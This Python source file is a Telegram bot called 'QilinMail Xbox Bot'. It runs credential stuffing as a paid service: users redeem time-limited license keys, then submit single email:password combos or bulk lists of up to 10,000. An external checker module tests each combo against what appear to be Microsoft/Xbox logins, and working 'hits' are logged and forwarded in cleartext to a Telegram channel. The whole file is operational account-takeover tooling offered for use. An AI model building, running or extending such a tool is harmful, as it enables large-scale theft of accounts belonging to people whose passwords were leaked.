"""
╔══════════════════════════════════════════════════╗
║           QilinMail Telegram Bot                 ║
║           MADE BY @NUTFRR                        ║
╚══════════════════════════════════════════════════╝
"""

import os
import sys
import json
import time
import random
import string
import asyncio
import logging
import threading
import importlib.util
from datetime import datetime, timedelta
from pathlib import Path

from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    BotCommand, InputFile
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode

# ─────────────────────────────────────────────────
#  CONFIG
# ─────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_IDS  = [int(x) for x in os.getenv("ADMIN_IDS", "8381786447").split(",") if x.strip()]
STORE_FILE = "bot_store.json"
HITS_DIR   = "bot_hits"
os.makedirs(HITS_DIR, exist_ok=True)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

# ─────────────────────────────────────────────────
#  IMPORT CHECKER  (checker_fixed.py next to bot)
# ─────────────────────────────────────────────────
_checker_path = Path(__file__).parent / "checker_fixed.py"
_checker_mod  = None

def _load_checker():
    global _checker_mod
    if _checker_mod:
        return _checker_mod
    if not _checker_path.exists():
        log.error("checker_fixed.py not found next to tg_bot.py")
        return None
    spec = importlib.util.spec_from_file_location("qilin_checker", _checker_path)
    mod  = importlib.util.module_from_spec(spec)
    # Suppress the checker's own interactive main() on import
    mod.__name__ = "qilin_checker"
    try:
        spec.loader.exec_module(mod)
    except SystemExit:
        pass
    except Exception as e:
        log.error(f"Checker load error: {e}")
        return None
    _checker_mod = mod
    return mod

# ─────────────────────────────────────────────────
#  PERSISTENT STORE
# ─────────────────────────────────────────────────
class Store:
    _DEFAULTS = {
        "users":   {},   # uid -> {auth_until, checks, hits, joined}
        "keys":    {},   # key -> {created, used, uid, days|-1}
        "stats":   {"total_checks": 0, "total_hits": 0, "total_users": 0},
        "hits_channel": None,
        "sessions": {},  # uid -> {running, stop_flag, task_id}
    }

    def __init__(self, path=STORE_FILE):
        self.path = path
        self.data = json.loads(json.dumps(self._DEFAULTS))
        self._lock = threading.Lock()
        self._load()

    def _load(self):
        try:
            with open(self.path) as f:
                saved = json.load(f)
            for k, v in saved.items():
                if k in self.data:
                    if isinstance(v, dict):
                        self.data[k].update(v)
                    else:
                        self.data[k] = v
        except FileNotFoundError:
            pass
        except Exception as e:
            log.warning(f"Store load error: {e}")

    def save(self):
        with self._lock:
            try:
                with open(self.path, "w") as f:
                    json.dump(self.data, f, indent=2)
            except Exception as e:
                log.warning(f"Store save error: {e}")

    # ── user helpers ──
    def get_user(self, uid: int) -> dict:
        uid = str(uid)
        if uid not in self.data["users"]:
            self.data["users"][uid] = {
                "auth_until": None, "checks": 0, "hits": 0, "joined": time.time()
            }
        return self.data["users"][uid]

    def is_authed(self, uid: int) -> bool:
        if uid in ADMIN_IDS:
            return True
        u = self.get_user(uid)
        if u["auth_until"] is None:
            return False
        if u["auth_until"] == -1:
            return True
        return time.time() < u["auth_until"]

    def auth_user(self, uid: int, days: int | None = None):
        u = self.get_user(uid)
        if days is None or days <= 0:
            u["auth_until"] = -1          # lifetime
        else:
            base = max(time.time(), u["auth_until"] or 0)
            u["auth_until"] = base + days * 86400
        self.save()

    def revoke_user(self, uid: int):
        u = self.get_user(uid)
        u["auth_until"] = None
        self.save()

    def add_check(self, uid: int, hit: bool):
        u = self.get_user(uid)
        u["checks"] += 1
        if hit:
            u["hits"] += 1
        s = self.data["stats"]
        s["total_checks"] += 1
        if hit:
            s["total_hits"] += 1
        self.save()

    # ── key helpers ──
    def gen_key(self, days: int | None = None) -> str:
        key = "NUTFRR-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
        self.data["keys"][key] = {
            "created": time.time(), "used": False, "uid": None,
            "days": days if days and days > 0 else -1
        }
        self.save()
        return key

    def redeem_key(self, uid: int, key: str) -> tuple[bool, str]:
        k = self.data["keys"].get(key)
        if not k:
            return False, "❌ Invalid key."
        if k["used"]:
            return False, "❌ Key already used."
        k["used"] = True
        k["uid"]  = str(uid)
        days = k["days"]
        self.auth_user(uid, None if days == -1 else days)
        label = "lifetime" if days == -1 else f"{days}d"
        self.save()
        return True, f"✅ Key redeemed! Access: **{label}**"

    # ── channel ──
    def set_hits_channel(self, cid):
        self.data["hits_channel"] = cid
        self.save()

    def get_hits_channel(self):
        return self.data["hits_channel"]


store = Store()

# ─────────────────────────────────────────────────
#  KEYBOARDS
# ─────────────────────────────────────────────────
def kb_main(uid: int) -> InlineKeyboardMarkup:
    authed = store.is_authed(uid)
    is_admin = uid in ADMIN_IDS
    rows = []
    if authed:
        rows.append([
            InlineKeyboardButton("🎮 Single Check", callback_data="single_check"),
            InlineKeyboardButton("📂 Bulk Check",   callback_data="bulk_check"),
        ])
        rows.append([
            InlineKeyboardButton("📊 My Stats",   callback_data="my_stats"),
            InlineKeyboardButton("🏆 Last Hits",  callback_data="last_hits"),
        ])
    else:
        rows.append([InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_key")])

    if is_admin:
        rows.append([InlineKeyboardButton("🛡️ Admin Panel", callback_data="admin_panel")])

    rows.append([InlineKeyboardButton("ℹ️ Help", callback_data="help")])
    return InlineKeyboardMarkup(rows)


def kb_admin() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🔑 Gen Key 1d",       callback_data="admin_gen1d"),
            InlineKeyboardButton("🔑 Gen Key 7d",       callback_data="admin_gen7d"),
        ],
        [
            InlineKeyboardButton("🔑 Gen Key 30d",      callback_data="admin_gen30d"),
            InlineKeyboardButton("🔑 Gen Lifetime Key", callback_data="admin_genlt"),
        ],
        [
            InlineKeyboardButton("✅ Auth User",        callback_data="admin_auth"),
            InlineKeyboardButton("❌ Revoke User",      callback_data="admin_revoke"),
        ],
        [
            InlineKeyboardButton("📡 Set Hits Channel", callback_data="admin_setchannel"),
            InlineKeyboardButton("📢 Broadcast",        callback_data="admin_broadcast"),
        ],
        [
            InlineKeyboardButton("📊 Global Stats",     callback_data="admin_stats"),
        ],
        [InlineKeyboardButton("◀️ Back", callback_data="main_menu")],
    ])


def kb_check_running() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop Check", callback_data="stop_check")],
    ])


def kb_back() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data="main_menu")]])


# ─────────────────────────────────────────────────
#  PENDING STATE  (waiting for user text input)
# ─────────────────────────────────────────────────
_pending: dict[int, str] = {}   # uid -> state_name


# ─────────────────────────────────────────────────
#  CHECKER HELPERS
# ─────────────────────────────────────────────────
def _run_single_check(email: str, password: str) -> dict:
    """
    Run one combo through the checker. Returns a result dict.
    Falls back to a lightweight direct API check if checker import fails.
    """
    mod = _load_checker()
    result = {
        "email": email, "password": password,
        "hit": False, "error": None, "detail": ""
    }
    if mod is None:
        result["error"] = "Checker module not loaded."
        return result
    try:
        # Patch globals the checker needs
        mod.config = mod.Config()
        mod.config.set("timeout", 15)
        mod.config.set("check_microsoft_balance", False)
        mod.config.set("check_reward_points",     False)
        mod.config.set("scan_inbox",              False)
        mod.config.set("payment",                 True)
        mod.proxylist  = []
        mod.proxytype  = "'4'"
        mod.maxretries = 1
        # Reset counters
        for _attr in ("hits","bad","checked","cpm","twofa","vm","retries","errors",
                      "xgp","xgpu","other","mfa","sfa"):
            setattr(mod, _attr, 0)

        # Disable UI
        mod.UI_ENABLED = False
        mod.ui = None

        auth_result = mod.authenticate(email, password, use_optimized=False)
        result["hit"] = bool(auth_result)
    except Exception as e:
        result["error"] = str(e)[:200]
    return result


def _fmt_hit(email: str, password: str, detail: str = "") -> str:
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    lines = [
        "╔══════════════════════════════╗",
        "║  🎯  HIT FOUND   ║",
        "╚══════════════════════════════╝",
        f"📧 Email   : <code>{email}</code>",
        f"🔑 Password: <code>{password}</code>",
    ]
    if detail:
        lines.append(f"📋 Detail  : {detail}")
    lines += [
        f"🕒 Time    : {ts}",
        "",
        "🌟 MADE BY @NUTFRR",
    ]
    return "\n".join(lines)


# ─────────────────────────────────────────────────
#  COMMAND HANDLERS
# ─────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u   = store.get_user(uid)
    authed = store.is_authed(uid)

    welcome = (
        "╔══════════════════════════════╗\n"
        "║  🎮  <b>QilinMail Xbox Bot</b>  ║\n"
        "╚══════════════════════════════╝\n\n"
        f"👤 User ID: <code>{uid}</code>\n"
        f"✅ Access : {'<b>Active</b>' if authed else '<b>No Access</b>'}\n\n"
        "MADE BY @NUTFRR"
    )
    await update.message.reply_text(welcome, parse_mode=ParseMode.HTML,
                                    reply_markup=kb_main(uid))


async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not store.is_authed(uid):
        await update.message.reply_text(
            "❌ No access. Use /redeem KEY to activate.",
            reply_markup=kb_back()
        )
        return
    args = ctx.args
    if not args:
        await update.message.reply_text(
            "Usage: /check email:password",
            reply_markup=kb_back()
        )
        return
    combo = args[0]
    if ":" not in combo:
        await update.message.reply_text("❌ Format: email:password")
        return
    email, password = combo.split(":", 1)
    msg = await update.message.reply_text("🔄 Checking...")
    result = await asyncio.get_event_loop().run_in_executor(
        None, _run_single_check, email.strip(), password.strip()
    )
    store.add_check(uid, result["hit"])
    if result["hit"]:
        text = _fmt_hit(email, password, result.get("detail",""))
        await msg.edit_text(text, parse_mode=ParseMode.HTML)
        ch = store.get_hits_channel()
        if ch:
            try: await ctx.bot.send_message(ch, text, parse_mode=ParseMode.HTML)
            except: pass
    elif result["error"]:
        await msg.edit_text(f"⚠️ Error: {result['error']}")
    else:
        await msg.edit_text("❌ BAD — Invalid credentials or no Xbox account.")


async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid  = update.effective_user.id
    args = ctx.args
    if not args:
        await update.message.reply_text("Usage: /redeem KEY")
        return
    ok, msg_text = store.redeem_key(uid, args[0].strip())
    await update.message.reply_text(msg_text, parse_mode=ParseMode.MARKDOWN,
                                    reply_markup=kb_main(uid))


async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u   = store.get_user(uid)
    au  = u.get("auth_until")
    if au is None:
        exp = "No access"
    elif au == -1:
        exp = "Lifetime ♾️"
    else:
        d = max(0, int(au - time.time()))
        exp = f"{d//86400}d {(d%86400)//3600}h remaining"

    text = (
        f"📊 <b>Your Stats</b>\n\n"
        f"🔑 Access  : {exp}\n"
        f"🔍 Checks  : {u['checks']}\n"
        f"🎯 Hits    : {u['hits']}\n"
        f"📅 Joined  : {datetime.fromtimestamp(u['joined']).strftime('%Y-%m-%d')}\n"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML,
                                    reply_markup=kb_back())


async def cmd_panel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Admins only.")
        return
    s = store.data["stats"]
    text = (
        f"🛡️ <b>Admin Panel</b>\n\n"
        f"👥 Users  : {len(store.data['users'])}\n"
        f"✅ Checks : {s['total_checks']}\n"
        f"🎯 Hits   : {s['total_hits']}\n"
        f"📡 Channel: {store.get_hits_channel() or 'None'}\n"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML,
                                    reply_markup=kb_admin())


async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Admins only.")
        return
    args = ctx.args
    days = None
    if args:
        try:
            days = int(args[0])
        except:
            if args[0].lower() == "lifetime":
                days = -1
    key = store.gen_key(days)
    label = "Lifetime" if (days is None or days <= 0 or days == -1) else f"{days}d"
    await update.message.reply_text(
        f"🔑 New Key ({label}):\n<code>{key}</code>",
        parse_mode=ParseMode.HTML
    )


async def cmd_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Admins only.")
        return
    args = ctx.args
    if not args:
        await update.message.reply_text("Usage: /auth user_id [days]")
        return
    try:
        target = int(args[0])
        days   = int(args[1]) if len(args) > 1 else None
    except:
        await update.message.reply_text("Invalid args.")
        return
    store.auth_user(target, days)
    label = "Lifetime" if days is None else f"{days}d"
    await update.message.reply_text(f"✅ Authorized {target} for {label}.")


async def cmd_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Admins only.")
        return
    args = ctx.args
    if not args:
        await update.message.reply_text("Usage: /revoke user_id")
        return
    store.revoke_user(int(args[0]))
    await update.message.reply_text(f"❌ Revoked {args[0]}.")


async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Admins only.")
        return
    if not ctx.args:
        await update.message.reply_text("Usage: /broadcast message text")
        return
    msg_text = " ".join(ctx.args)
    sent = failed = 0
    for user_id in store.data["users"]:
        try:
            await ctx.bot.send_message(int(user_id), f"📢 {msg_text}")
            sent += 1
        except:
            failed += 1
    await update.message.reply_text(f"📢 Broadcast: {sent} sent, {failed} failed.")


# ─────────────────────────────────────────────────
#  CALLBACK HANDLERS
# ─────────────────────────────────────────────────
async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    uid = q.from_user.id
    data = q.data
    await q.answer()

    # ── main menu ──
    if data == "main_menu":
        await q.edit_message_text(
            "╔══════════════════════════════╗\n"
            "║  🎮  <b>QilinMail Xbox Bot</b>  ║\n"
            "╚══════════════════════════════╝\n\n"
            "MADE BY @NUTFRR",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_main(uid)
        )
        return

    # ── help ──
    if data == "help":
        txt = (
            "📖 <b>Commands</b>\n\n"
            "/check email:pass — single check\n"
            "/redeem KEY       — redeem access key\n"
            "/stats            — your stats\n"
            "/panel            — admin panel\n"
            "/genkey [days]    — gen key (admin)\n"
            "/auth uid [days]  — auth user (admin)\n"
            "/revoke uid       — revoke user (admin)\n"
            "/broadcast msg    — broadcast (admin)\n\n"
            "MADE BY @NUTFRR"
        )
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML,
                                   reply_markup=kb_back())
        return

    # ── single check ──
    if data == "single_check":
        if not store.is_authed(uid):
            await q.edit_message_text("❌ No access.", reply_markup=kb_back())
            return
        _pending[uid] = "awaiting_single"
        await q.edit_message_text(
            "🎮 <b>Single Check</b>\n\n"
            "Send the combo in format:\n"
            "<code>email:password</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="main_menu")
            ]])
        )
        return

    # ── bulk check ──
    if data == "bulk_check":
        if not store.is_authed(uid):
            await q.edit_message_text("❌ No access.", reply_markup=kb_back())
            return
        _pending[uid] = "awaiting_bulk_file"
        await q.edit_message_text(
            "📂 <b>Bulk Check</b>\n\n"
            "Upload a <code>.txt</code> file with combos:\n"
            "<code>email:password</code> (one per line)\n\n"
            "Max 10,000 combos.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="main_menu")
            ]])
        )
        return

    # ── redeem key ──
    if data == "redeem_key":
        _pending[uid] = "awaiting_redeem"
        await q.edit_message_text(
            "🔑 <b>Redeem Key</b>\n\nSend your key:",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("❌ Cancel", callback_data="main_menu")
            ]])
        )
        return

    # ── my stats ──
    if data == "my_stats":
        u  = store.get_user(uid)
        au = u.get("auth_until")
        if au is None:
            exp = "No access"
        elif au == -1:
            exp = "Lifetime ♾️"
        else:
            d = max(0, int(au - time.time()))
            exp = f"{d//86400}d {(d%86400)//3600}h"
        txt = (
            f"📊 <b>Stats</b>\n\n"
            f"🔑 Access : {exp}\n"
            f"🔍 Checks : {u['checks']}\n"
            f"🎯 Hits   : {u['hits']}\n"
            f"📅 Joined : {datetime.fromtimestamp(u['joined']).strftime('%Y-%m-%d')}\n"
        )
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML,
                                   reply_markup=kb_back())
        return

    # ── last hits ──
    if data == "last_hits":
        path = Path(HITS_DIR) / f"{uid}_hits.txt"
        if not path.exists():
            await q.edit_message_text("📭 No hits yet.", reply_markup=kb_back())
            return
        with open(path) as f:
            lines = f.read().strip().splitlines()[-20:]
        txt = "🏆 <b>Your Last Hits</b>\n\n" + "\n".join(
            f"<code>{l}</code>" for l in lines
        )
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML,
                                   reply_markup=kb_back())
        return

    # ── stop check ──
    if data == "stop_check":
        sess = ctx.user_data.get("bulk_stop")
        if sess:
            sess["stop"] = True
        await q.edit_message_text("🛑 Stop signal sent.", reply_markup=kb_back())
        return

    # ── admin panel ──
    if data == "admin_panel":
        if uid not in ADMIN_IDS:
            await q.answer("❌ Admins only.")
            return
        s = store.data["stats"]
        txt = (
            f"🛡️ <b>Admin Panel</b>\n\n"
            f"👥 Users  : {len(store.data['users'])}\n"
            f"✅ Checks : {s['total_checks']}\n"
            f"🎯 Hits   : {s['total_hits']}\n"
            f"📡 Channel: {store.get_hits_channel() or 'None'}\n"
        )
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML,
                                   reply_markup=kb_admin())
        return

    # ── admin gen keys ──
    if data.startswith("admin_gen"):
        if uid not in ADMIN_IDS:
            return
        days_map = {"admin_gen1d": 1, "admin_gen7d": 7, "admin_gen30d": 30, "admin_genlt": -1}
        days = days_map.get(data)
        key  = store.gen_key(days)
        label = "Lifetime" if (days == -1 or days is None) else f"{days}d"
        await q.answer(f"Key generated ({label})", show_alert=False)
        await q.edit_message_text(
            f"🔑 New Key ({label}):\n<code>{key}</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_admin()
        )
        return

    # ── admin auth/revoke/broadcast/setchannel via pending ──
    if data == "admin_auth":
        if uid not in ADMIN_IDS: return
        _pending[uid] = "admin_auth"
        await q.edit_message_text(
            "✅ Send: <code>user_id [days]</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data="admin_panel")]])
        )
        return

    if data == "admin_revoke":
        if uid not in ADMIN_IDS: return
        _pending[uid] = "admin_revoke"
        await q.edit_message_text(
            "❌ Send: <code>user_id</code>",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data="admin_panel")]])
        )
        return

    if data == "admin_broadcast":
        if uid not in ADMIN_IDS: return
        _pending[uid] = "admin_broadcast"
        await q.edit_message_text(
            "📢 Send your broadcast message:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data="admin_panel")]])
        )
        return

    if data == "admin_setchannel":
        if uid not in ADMIN_IDS: return
        _pending[uid] = "admin_setchannel"
        await q.edit_message_text(
            "📡 Send channel ID or username (e.g. <code>-100xxxxxxxxxx</code> or <code>@channelusername</code>):",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("◀️ Back", callback_data="admin_panel")]])
        )
        return

    if data == "admin_stats":
        if uid not in ADMIN_IDS: return
        s = store.data["stats"]
        keys_total = len(store.data["keys"])
        keys_used  = sum(1 for k in store.data["keys"].values() if k["used"])
        authed_users = sum(1 for u in store.data["users"].values()
                          if u.get("auth_until") is not None)
        txt = (
            f"📊 <b>Global Stats</b>\n\n"
            f"👥 Total Users  : {len(store.data['users'])}\n"
            f"✅ Authed Users : {authed_users}\n"
            f"🔍 Total Checks : {s['total_checks']}\n"
            f"🎯 Total Hits   : {s['total_hits']}\n"
            f"🔑 Keys Total   : {keys_total}\n"
            f"🔑 Keys Used    : {keys_used}\n"
        )
        await q.edit_message_text(txt, parse_mode=ParseMode.HTML,
                                   reply_markup=kb_admin())
        return


# ─────────────────────────────────────────────────
#  MESSAGE HANDLER  (handles pending states)
# ─────────────────────────────────────────────────
async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    state = _pending.pop(uid, None)

    # ── single check ──
    if state == "awaiting_single":
        combo = update.message.text.strip()
        if ":" not in combo:
            await update.message.reply_text("❌ Format: email:password",
                                             reply_markup=kb_main(uid))
            return
        email, password = combo.split(":", 1)
        msg = await update.message.reply_text("🔄 Checking...")
        result = await asyncio.get_event_loop().run_in_executor(
            None, _run_single_check, email.strip(), password.strip()
        )
        store.add_check(uid, result["hit"])
        if result["hit"]:
            text = _fmt_hit(email, password, result.get("detail",""))
            await msg.edit_text(text, parse_mode=ParseMode.HTML,
                                 reply_markup=kb_main(uid))
            # save hit
            path = Path(HITS_DIR) / f"{uid}_hits.txt"
            with open(path, "a") as f:
                f.write(f"{email}:{password}\n")
            ch = store.get_hits_channel()
            if ch:
                try: await ctx.bot.send_message(ch, text, parse_mode=ParseMode.HTML)
                except: pass
        elif result["error"]:
            await msg.edit_text(f"⚠️ Error: {result['error']}",
                                 reply_markup=kb_main(uid))
        else:
            await msg.edit_text("❌ BAD — Invalid credentials or no Xbox account.",
                                 reply_markup=kb_main(uid))
        return

    # ── redeem key ──
    if state == "awaiting_redeem":
        key = update.message.text.strip()
        ok, msg_text = store.redeem_key(uid, key)
        await update.message.reply_text(msg_text, parse_mode=ParseMode.MARKDOWN,
                                         reply_markup=kb_main(uid))
        return

    # ── admin auth ──
    if state == "admin_auth":
        parts = update.message.text.strip().split()
        try:
            target = int(parts[0])
            days   = int(parts[1]) if len(parts) > 1 else None
        except:
            await update.message.reply_text("❌ Invalid format.", reply_markup=kb_admin())
            return
        store.auth_user(target, days)
        label = "Lifetime" if days is None else f"{days}d"
        await update.message.reply_text(f"✅ Authorized {target} for {label}.",
                                         reply_markup=kb_admin())
        return

    # ── admin revoke ──
    if state == "admin_revoke":
        try:
            target = int(update.message.text.strip())
        except:
            await update.message.reply_text("❌ Invalid user_id.", reply_markup=kb_admin())
            return
        store.revoke_user(target)
        await update.message.reply_text(f"❌ Revoked {target}.", reply_markup=kb_admin())
        return

    # ── admin broadcast ──
    if state == "admin_broadcast":
        msg_text = update.message.text.strip()
        sent = failed = 0
        for user_id in store.data["users"]:
            try:
                await ctx.bot.send_message(int(user_id), f"📢 {msg_text}")
                sent += 1
            except:
                failed += 1
        await update.message.reply_text(f"📢 Broadcast: {sent} sent, {failed} failed.",
                                         reply_markup=kb_admin())
        return

    # ── admin set channel ──
    if state == "admin_setchannel":
        ch = update.message.text.strip()
        store.set_hits_channel(ch)
        await update.message.reply_text(f"📡 Hits channel set: <code>{ch}</code>",
                                         parse_mode=ParseMode.HTML,
                                         reply_markup=kb_admin())
        return

    # ── no pending state ──
    await update.message.reply_text(
        "Use /start to open the menu.",
        reply_markup=kb_main(uid)
    )


# ─────────────────────────────────────────────────
#  DOCUMENT HANDLER  (bulk .txt upload)
# ─────────────────────────────────────────────────
async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    state = _pending.pop(uid, None)

    if state != "awaiting_bulk_file":
        # ignore documents if not expecting one
        return

    if not store.is_authed(uid):
        await update.message.reply_text("❌ No access.")
        return

    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Please send a .txt file.",
                                         reply_markup=kb_main(uid))
        return

    # Download file
    tg_file = await ctx.bot.get_file(doc.file_id)
    local   = Path(HITS_DIR) / f"bulk_{uid}_{int(time.time())}.txt"
    await tg_file.download_to_drive(local)

    with open(local) as f:
        raw_lines = [l.strip() for l in f if l.strip() and ":" in l]

    if not raw_lines:
        await update.message.reply_text("❌ No valid combos found.",
                                         reply_markup=kb_main(uid))
        return

    combos = raw_lines[:10_000]
    total  = len(combos)

    msg = await update.message.reply_text(
        f"📂 Loaded <b>{total}</b> combos.\n🔄 Starting check...",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_check_running()
    )

    stop_flag = {"stop": False}
    ctx.user_data["bulk_stop"] = stop_flag

    hits_lines = []
    bad_count  = 0
    hit_count  = 0
    checked    = 0
    start      = time.time()

    UPDATE_EVERY = max(1, min(50, total // 20))

    for combo in combos:
        if stop_flag.get("stop"):
            break
        email, password = combo.split(":", 1)
        result = await asyncio.get_event_loop().run_in_executor(
            None, _run_single_check, email.strip(), password.strip()
        )
        checked += 1
        store.add_check(uid, result["hit"])

        if result["hit"]:
            hit_count += 1
            line = f"{email}:{password}"
            hits_lines.append(line)
            # save locally
            path = Path(HITS_DIR) / f"{uid}_hits.txt"
            with open(path, "a") as f:
                f.write(line + "\n")
            # forward to hits channel
            ch = store.get_hits_channel()
            if ch:
                try:
                    await ctx.bot.send_message(
                        ch, _fmt_hit(email, password), parse_mode=ParseMode.HTML
                    )
                except:
                    pass
        else:
            bad_count += 1

        if checked % UPDATE_EVERY == 0 or checked == total:
            elapsed = time.time() - start
            cpm     = int(checked / elapsed * 60) if elapsed > 1 else 0
            pct     = int(checked / total * 100)
            bar     = "█" * (pct // 10) + "░" * (10 - pct // 10)
            try:
                await msg.edit_text(
                    f"📂 <b>Bulk Check</b> [{bar}] {pct}%\n\n"
                    f"✅ Checked : {checked}/{total}\n"
                    f"🎯 Hits    : {hit_count}\n"
                    f"❌ Bad     : {bad_count}\n"
                    f"⚡ CPM     : {cpm}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=kb_check_running()
                )
            except:
                pass

    # Send result files
    done_txt = (
        f"✅ <b>Check Complete</b>\n\n"
        f"📊 Total  : {total}\n"
        f"🎯 Hits   : {hit_count}\n"
        f"❌ Bad    : {bad_count}\n\n"
        "MADE BY @NUTFRR"
    )
    await ctx.bot.send_message(uid, done_txt, parse_mode=ParseMode.HTML,
                                reply_markup=kb_main(uid))

    if hits_lines:
        hits_file = Path(HITS_DIR) / f"hits_{uid}_{int(time.time())}.txt"
        with open(hits_file, "w") as f:
            f.write("\n".join(hits_lines))
        await ctx.bot.send_document(uid, InputFile(str(hits_file), filename="hits.txt"),
                                    caption=f"🎯 {hit_count} hits found — @NUTFRR")

    # bad file
    bad_lines = [c for c in combos if c.split(":")[0] not in
                 {l.split(":")[0] for l in hits_lines}]
    if bad_lines:
        bad_file = Path(HITS_DIR) / f"bad_{uid}_{int(time.time())}.txt"
        with open(bad_file, "w") as f:
            f.write("\n".join(bad_lines))
        await ctx.bot.send_document(uid, InputFile(str(bad_file), filename="bad.txt"),
                                    caption=f"❌ {bad_count} bad accounts")

    # cleanup
    try: local.unlink()
    except: pass


# ─────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    # commands
    app.add_handler(CommandHandler("start",     cmd_start))
    app.add_handler(CommandHandler("check",     cmd_check))
    app.add_handler(CommandHandler("redeem",    cmd_redeem))
    app.add_handler(CommandHandler("stats",     cmd_stats))
    app.add_handler(CommandHandler("panel",     cmd_panel))
    app.add_handler(CommandHandler("genkey",    cmd_genkey))
    app.add_handler(CommandHandler("auth",      cmd_auth))
    app.add_handler(CommandHandler("revoke",    cmd_revoke))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))

    # callbacks
    app.add_handler(CallbackQueryHandler(on_callback))

    # messages
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_message))

    print("╔══════════════════════════════════╗")
    print("║  QilinMail Xbox Bot  STARTING    ║")
    print("║  MADE BY @NUTFRR                 ║")
    print("╚══════════════════════════════════╝")

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
